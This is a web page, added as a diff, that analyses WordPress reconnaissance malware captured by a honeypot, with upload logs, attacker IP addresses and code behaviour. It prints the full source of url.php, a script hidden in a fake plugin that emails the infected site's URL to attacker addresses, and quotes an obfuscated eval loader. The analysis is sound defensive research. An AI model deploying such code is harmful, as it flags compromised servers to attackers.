@@ -1,0 +1,407 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<title>PHParasites:  WordPress Malware</title>
+<meta name="google-site-verification" content="ixC4wtdetOlWNosRSwl6CFgRutGwfbq_9r9z534uRkY" />
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<style type="text/css">
+html,body{margin:0;padding:0}
+body{font: 76% arial,sans-serif}
+p{margin:0 10px 10px}
+div#header h1{height:80px;line-height:80px;margin:0; padding-left:10px;background: #EEE;color: #79B30B}
+div#subheader h2{height:15px;line-height:15px;margin:5px; padding-left:10px;color: #79B30B}
+div#subsubheader h3{height:10px;line-height:10px;margin:5px; padding-left:12px;color: #79B30B}
+div#content p{line-height:1.4}
+div#content pre{line-height:1.4;margin:5px;font:100% courier;}
+div#content kbd{font:100% courier;}
+div#content table{margin:10px;}
+div#navigation{background:#B9CAFF}
+div#extra{background:#FF8539}
+div#footer{background: #333;color: #FFF}
+div#footer p{margin:0;padding:5px 10px}
+div#wrapper{float:left;width:100%}
+div#content{margin: 0 25%}
+div#navigation{float:left;width:25%;margin-left:-100%}
+div#extra{float:left;width:25%;margin-left:-25%}
+div#footer{clear:left;width:100%}
+</style>
+</head>
+<body>
+<div id="container">
+<div id="header">
+	<h1>PHParasites:  WordPress Malware</h1>
+</div>
+<div id="wrapper">
+<div id="content">
+<div id="subheader"><h2>Reconnaissance Tools</h2></div>
+<p>
+Reconnaissance tools collect and send back information about the
+software available on a WordPress host.
+That information ranges from sending an email to a well known address, to
+scanning the host system for whatever other CMS (besides WordPress)
+system(s) and database(s) it might execute.
+</p>
+<p>
+The <a href="wso.html">WSO web shell</a> includes decent recon capability,
+displaying operating system and version, PHP version, size of filesystem
+and includes a "Sec. Info" action. This last action shows HTTP server
+version, interesting executables available, including which databases
+are installed.  I examine WSO separately.
+</p>
+<div id="subsubheader"><h3>Self Destructing Probe - LijHgs3*.php</h3></div>
+<p>
+I encountered a "self destructing" reconnaissance program.
+124 PHP files with names like <kbd>LijHgs3_8878737.php</kbd>
+and <kbd>LijHgs3_2791796.php</kbd> got uploaded 
+between 2013-06-23T02:24:35-06 and 2013-06-23T04:18:27-06.
+The uploads came from 114 different IP addresses, which <kbd>p0f</kbd>
+identified as mostly Windows XP, Windows Vista, with a
+couple of IP addresses identified as Linux.
+All uploads were by <a href="wso.html">WSO web shell</a> file upload.
+All 124 uploads called WSO as <kbd>502.php</kbd>.
+Each of the 124 uploads had a different substring of digits, indicating
+some coordination between the 114 IP addresses.
+</p>
+<p>
+In turn, <kbd>502.php</kbd> was uploaded 3 times before
+the "LijHgs3" PHP files were uploaded, and many times afterward,
+always using the fake WordPress "plugin upload" feature.
+2 unique IP addresses,
+188.92.74.87 and 91.197.19.103, uploaded
+<kbd>502.php</kbd> between 2013-06-16 and 2013-06-21.
+Neither 188.92.74.87 nor 91.197.19.103 uploaded "LijHgs3" PHP files.
+<kbd>p0f</kbd> said that 188.92.74.87 was Windows 2000 or Windows XP,
+and that 91.197.19.103 ran Windows Vista.
+</p>
+<p>
+Nothing ever actually invoked any of the "LijHgs3" PHP files,
+perhaps because the honey pot's <a href="pseudo_wso.phps">fake WSO</a>
+(at the time) did not confirm uploads correctly by
+displaying the uploaded file name.
+I later changed that aspect of the fake WSO.
+</p>
+<p>
+The "LijHgs3" source code:
+</p>
+<ol>
+	<li>created a directory</li>
+	<li>created a file in that directory</li>
+	<li>wrote the string "np9i8gkli" to the file</li>
+	<li>used PHP's <kbd>file_get_contents()</kbd> to read the file</li>
+	<li>If "LijHgs3" read the same string that it wrote, it echoed "np9i8gkli"
+	<li>otherwise it echoed "sdcoiwenldz33s"</li>
+	<li>It unlinked ("deleted") all files named "LijHgs3_*" in the current directory</li>
+	<li>It ran <kbd>echo 'bbbpathsbbb'.'http://stratigery.com/'.'eeepathseee';</kbd></li>
+</ol>
+<p>
+The output of the final "echo" is clearly machine-parseable, designed to be read by
+some program. The strings for successful or error file write and read
+are a bit less obvious, not even having the same string length.
+</p>
+<p>
+The coding style of the final echo indicates that the "LijHgs3" programs
+were all programmatically generated, as there is no reason to
+concatenate 3 strings other than convenience in writing the program
+that generated the "LijHgs3" programs.
+</p>
+<div id="subsubheader"><h3>Xgr0upvn Data Checker Tool vBeta</h3></div>
+<p>
+Downloaded via WSO 'uploadFile' by a Windows Vista machine at 117.0.42.185, and 
+invoked 39 seconds later by that same machine, this recon tool walks the user through
+a password login and some other nonsense, to produce a list of files
+in the directory it runs from, with MD5 checksums.
+The program is unusual as it contains dual Vietnamese/English strings
+in a primitive attempt at I18N coding.  The IP address is in a Vietnamese
+ISP's netblock.
+</p>
+<p>
+The timing of the upload and invocation, as well as what else the IP
+address asked for (<kbd>/favicon.ico</kbd>, for example) indicate that
+this might have been a <em>manual</em> exploit attempt.
+Either the uploader was a Windows user or silly, because the PHP code
+was uploaded as "Shell.php", but attempted invocation was as "shell.php".
+That would work for a Windows HTTP server (I think), but not a Linux
+server.
+</p>
+<p>
+Not the same as <a href="http://tibbah.com/files/a.txt">Xgr0upVN ShElL</a>,
+but may be from the same Vietnamese hacker collective.
+</p>
+<p>
+The WSO shell URL used to upload the XgrOupVN Data Checker Tool was <kbd>jm.php</kbd>.
+WSO had been uploaded as <kbd>jm.php</kbd> 10 times between 2013-06-19 and 2013-06-26,
+by 6 different IP addresses
+two months before 117.0.42.185 tried to invoke it.
+That statement gives a bit of a false impression, as 20 different IP addresses
+invoked <kbd>jm.php</kbd> between 2013-06-19 and 2013-09-11.
+It appears that knowledge of a nominally successful WSO upload gets shared or
+sold around.
+</p>
+<div id="subsubheader"><h3><a name="SMTP">SMTP Tests</a></h3></div>
+<p>
+The <a href="testm.html">obfuscated code champion</a> is actually
+a pretty simple SMTP tester, emailing to a single, hard-coded 
+SMTP address.
+</p>
+<p>
+The code sent to <a href="backdoors.html">7c334.php</a> contained two different
+SMTP testers.
+</p>
+<p>
+</p>
+<div id="subsubheader"><h3><a name="connector_t.php">connector_t.php</a></h3></div>
+<p>
+<kbd>connector_t.php</kbd> got uploaded to a previously-installed <a href="wso.html">WSO web shell</a>
+named <kbd>info.php</kbd>. Both times WSO would have named the uploaded code "connector_t.php".
+</p>
+<table border="0">
+<tr>
+	<th>Timestamp</th>
+	<th>From IP address</th>
+	<th>URL</th>
+<tr>
+	<td>2013-08-20T01:35:27-06</td>
+	<td>188.135.184.119</td>
+	<td>/wp-content/plugins/customize-admin/info.php</td>
+</tr>
+<tr>
+	<td>2013-08-22T14:07:52-06</td>
+	<td>117.253.203.39</td>
+	<td>/wp-content/plugins/customize-admin/info.php</td>
+</tr>
+</table>
+<p>
+<kbd>connector_t.php</kbd> got invoked 2 seconds after download with no
+parameters. This shows how
+hard it is to emulate malware on honey pots: automatic download and testing gives
+the honey pot operator no time to check out the downloaded code.
+</p>
+<table border="0">
+<tr>
+	<th>Timestamp</th>
+	<th>From IP address</th>
+</tr>
+<tr>
+	<td>2013-08-20 01:35:29-06</td><td>188.135.184.119</td>
+<tr>
+</tr>
+	<td>2013-08-22 14:07:54-06</td><td>117.253.203.39</td>
+</tr>
+</table>
+<p><kbd>connector_t.php</kbd> gives back a single line of text upon
+invocation:
+<kbd>init::f6mnZP0cwKNo9q::5.2.14::ok</kbd>.
+That's the PHP version number, a hardcoded string that looks random, and "ok"
+indicates that it can send SMTP email on the victim machine.
+<p>
+<kbd>connector_t.php's</kbd> code consists of a call to PHP's <kbd>mail()</kbd> function (address:
+'noreply@google.com') 3 times in a loop, after getting the PHP version number.
+If <kbd>mail()</kbd> succeeds any of the 3 times you get the 'ok' suffix on the output shown above.
+</p>
+<p>
+Multiple attempts at calling <kbd>mail('noreply@google.com', 'Noreply', '')</kbd>
+is emblematic. It appears that WordPress malware, or the hosts that WordPress
+runs on, have reliability issues. Malware tries every important operation
+at least two times without assuming an error condition.
+</p>
+<p>
+</p>
+<div id="subsubheader"><h3><a name="URLPHP">url.php</a></h3></div>
+<p>
+A very subtle STMP testing program, <kbd>url.php</kbd> got uploaded
+as just one PHP file out of many in a plugin named "Imailer". The
+<kbd>Imailer.zip</kbd> file contained the usual "Tumblr Importer"
+PHP files, but it also contained <kbd>mod_system.php</kbd>, a WSO v2.5
+web shell, <kbd>copyrights.php</kbd> (which is "<a href="emailers.html#POSTMAN">PostMan Full 3.5</a>"
+a spamming program), and <kbd>url.php</kbd> itself. The code is as follows:
+</p>
+<pre>
+&lt;?
+$rezmail1 = "izik.krg@gmail.com";
+$rezmail2 = "ghostx2040@gmail.com";
+$ip = getenv("REMOTE_ADDR");
+$host = $_SERVER['HTTP_HOST'];
+$self = $_SERVER['PHP_SELF'];
+$query = !empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : null;
+$url = !empty($query) ? "http://$host$self?$query" : "http://$host$self";
+$message .=
+"Position Available. Five hundred USD Weekly,Get Back for More Details\n";
+$subject = "Available position check within $url";
+$headers .= "MIME-Version: 1.0\n";
+mail($rezmail1,$subject,$message,$headers);
+mail($rezmail2,$subject,$message,$headers);
+?&gt;
+</pre>
+<p>
+It was uploaded by 95.57.60.115 at 2013-08-26T10:00:29-06, then invoked 
+at 2013-08-26T10:13:35-06.  The uploader had a User-Agent string of
+"Mozilla/5.0 (Windows NT 6.1; rv:19.0) Gecko/20100101 Firefox/19.0",
+while the invoker sent "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36",
+and also requested <kbd>/favicon.ico</kbd> right away.
+This looks like someone had a guess-password-install-malware program
+running. They got a notification that <kbd>url.php</kbd> was installed,
+and then tried it interactively.
+</p>
+<p>
+The really subtle part is that the message <kbd>url.php</kbd> sends
+looks like spam, an ad for a stupid money mule job with some scammers,
+perhaps. Note that the subject line of the email will have the URL
+of the <kbd>url.php</kbd> program itself. Conveniently, that's almost
+the URL of the "PostMan Full" spamming tool included in that plugin's
+zip file. Once "izik.krg" gets an email, he can fire up his spam
+command and control and start blasting out crap. In fact "izik" can
+automate the whole thing based on the "Subject:" line of the email.
+</p>
+<div id="subsubheader"><h3>CMS installations Check</h3></div>
+<p>
+Sent to my honey pot's WSO web shell emulation 43 times by 27 different IP address between
+2013-07-05T02:21:19-06 and 2013-08-21T07:43:30-06.
+</p>
+<p>
+The attacker invoked WSO web shell's "actionPHP" action, which means the HTTP request
+includes  raw PHP source code, and WSO executes<kbd>eval()</kbd> on it.
+The source code would never appear in the exploited host's filesystem, but my emulated WSO shell
+captures it.
+</p>
+<p>It amounts to a very long ASCII string, which gets eval'ed (inside WSO's PHP eval) like this:
+<kbd>eval(gzuncompress(base64_decode($eval_code)));</kbd>
+</p>
+<p>
+It looks for WordPress, Joomla, Drupal, TYPO3, phpBB, PunBB, e107, DataLife Engine
+and Simple Machines Forum installations, by changing directory up to the root of
+the file system. It then does a breadth-first recursive search up to 10 levels deep
+for what it considers "core files" of each of the CMSes it knows about.
+For instance, the "core files" of a WordPress installation amount to those named
+"wp-content", "wp-admin" and "wp-includes".
+</p>
+<p>
+The code handles Windows installations as well as Linux, mainly by substituting backslashes
+for slashes in file paths, although a few other considerations get taken care of.
+It looks like several people have worked on it: the original code appears neat and tidy,
+uniformly indented,
+and it has debug output using unadorned PHP <kbd>echo</kbd> commands.
+Any lines of code generating debug output have been commented out using '//'-style comment leaders.
+Some later debug output code additions break the uniform indentation, and got commented out using '#'-style
+comment leaders. Oddly the later debug output is preceded by <kbd>if($debug_mode)</kbd>,
+so whether output appears or not depends on the value of the <kbd>$debug_mode</kbd> variable,
+which is set to <kbd>false</kbd> at the very beginning of the code.  Why bother commenting it out?
+</p>
+<div id="subsubheader"><h3>SRVC WebShell modul</h3></div>
+<p>
+I'm going into somewhat more depth for the "SRVC WebShell modul" because
+I can't find it described anywhere.
+The "SRVC WebShell modul" [sic], collects a lot of information about the system
+it runs on, then returns a <a href="srvc.webshell.modul.out">Base-64 encoded, serialized PHP associative arrary</a>.
+The data it collects looks like this before encoding:
+</p>
+<pre>Array
+(
+    [os] =&gt; Linux
+    [osversion] =&gt; Linux bronze 3.12.3-1-ARCH #1 SMP PREEMPT Wed Dec 4 21:45:42 CET 2013 x86_64
+    [webserver] =&gt; Apache
+    [safemode] =&gt; 0
+    [disable_functions] =&gt; 
+    [curl] =&gt; 1
+    [php_api] =&gt; cli
+    [php_version] =&gt; 5.5.6
+    [basedir] =&gt; none
+    [timelimit] =&gt; 1
+    [userabort] =&gt; 1
+    [socket] =&gt; 1
+    [is_evalable] =&gt; 1
+    [is_execable] =&gt; 1
+    [is_mailable] =&gt; unknown
+    [sendmail_cmd] =&gt; [PHP] mail();
+)
+</pre>
+<p>
+SRVC WebShell modul often has multiple methods coded in it to find any of
+the above parameters. The code prefers to use PHP builtins (<kbd>php_uname()</kbd>)
+to find a value, but it ultimately falls back to a Linux-specific method, like
+shelling out to run <kbd>uname -s</kbd>. No Windows-specific fallbacks exist,
+as near as I can tell. Shelling out to run a command is a study in alternatives,
+starting by trying <kbd>shell_exec()</kbd>, trying 4 more PHP builtins, finally
+using <kbd>proc_open()</kbd> if none of the other alternatives work.
+</p>
+<p>
+SRVC WebShell modul tests if email works by sending email to a random, 32-character
+"user ID" at the domain <kbd>asdasd.ru</kbd>. It waits 8 seconds, then checks
+<kbd>http://asdasd.ru?u=<em>32-character random user ID</em></kbd> to see
+if the email arrived. The asdasd.ru service appears to be some weird Russian
+semi-anonymous email dead drop, but the SRVC WebShell modul uses it to advantage.
+If you send an email manually to asdasd.ru, it takes substantially longer than
+8 seconds to percolate messages up to the web interface, so I doubt that the SRVC code
+works correctly.
+</p>
+<p>
+One of the tests, the value of "is_evalable" above, is interesting. The "1" value
+indicates that an <kbd>eval()</kbd> worked. I can't really understand why you'd
+bother to test for a working <kbd>eval()</kbd> when the code that does the
+testing is executing courtesy of <kbd>eval(gzuncompress(base64_decode($eval_code)));</kbd>
+itself. Further, the code doing the testing got run by the <kbd>actionPHP</kbd> action
+of a <a href="wso.html">WSO web shell</a>. As it happens, WSO does an <kbd>eval()</kbd>
+on PHP code sent to it in that action. So, SRVC WebShell modul checks to see if
+<kbd>eval()</kbd> works inside of two layers of <kbd>eval()</kbd>. Either SRVC WebShell modul
+sometimes runs outside of WSO, or SRVC WebShell modul isn't executed by the same folks
+who wrote it. The attackers using it don't understand it, because the code just gets passed
+around from one bad coder to the next.
+</p>
+<p>
+The SRVC WebShell modul appears fairly unified, having a consistent variable
+and function naming and consistent bracket placement styles. 
+The programmer(s) indented it uniformly, at 1 ASCII space per indentation level,
+making for some dense code.
+The code has only
+a few comments, which appear to fall into 2 categories: commented-out debugging
+code, and a few "TODO" notes, which indicate places where even more alternatives
+could be implemented.
+</p>
+</div>
+</div>
+
+<div id="navigation">
+<div id="subheader"><h2>Sections</h2></div>
+<ul>
+	<li><a href="index.html">Introduction</a></li>
+	<li><a href="details.html">Honey Pot Details</a></li>
+	<li><a href="access.html">Obtaining Access</a></li>
+	<li><a href="comment_spam.html">Spam Posts</a></li>
+	<li><a href="wso.html">WSO Web Shell</a></li>
+	<li><a href="login.html">WSO Session Example</a></li>
+	<li><a href="emailers.html">Email Spam Tools</a></li>
+	<li>Reconnaissance Tools</li>
+	<li><a href="gateway.html">File Retrieval Gateway</a></li>
+	<li><a href="testm.html">Obfuscated Code Champion</a></li>
+	<li><a href="backdoors.html">Back Doors</a></li>
+</ul>
+</div>
+
+<div id="extra">
+<div id="subheader"><h2>Author</h2></div>
+<p>
+<a href="mailto:bediger@stratigery.com">Bruce Ediger</a>, October, 2013.
+</p>
+<div id="subheader"><h2>Recon Tool Source Code</h2></div>
+<p>
+<a href="LijHgs3.phps">Self destructing probe</a>.
+</p>
+<p>
+<a href="xgr0up.txt">Xgr0upvn Data Checker Tool vBeta</a>.
+</p>
+<p>
+<a href="connector_t.phps">connector_t.php</a>.
+</p>
+<p>
+<a href="cms.config.checker.phps">CMS Installation Checks</a>.
+</p>
+<p>
+<a href="srvc.webshell.modul.phps">SRVC WebShell modul</a>.
+</p>
+<p>
+SRVC WebShell modul <a href="srvc.webshell.modul.out">output</a>.
+</p>
+</div>
+<div id="footer"><p>Up to Bruce Ediger's <a style="color:white;" href="/">Web pages</a>.</p></div>
+</div>
+</body>
+</html>
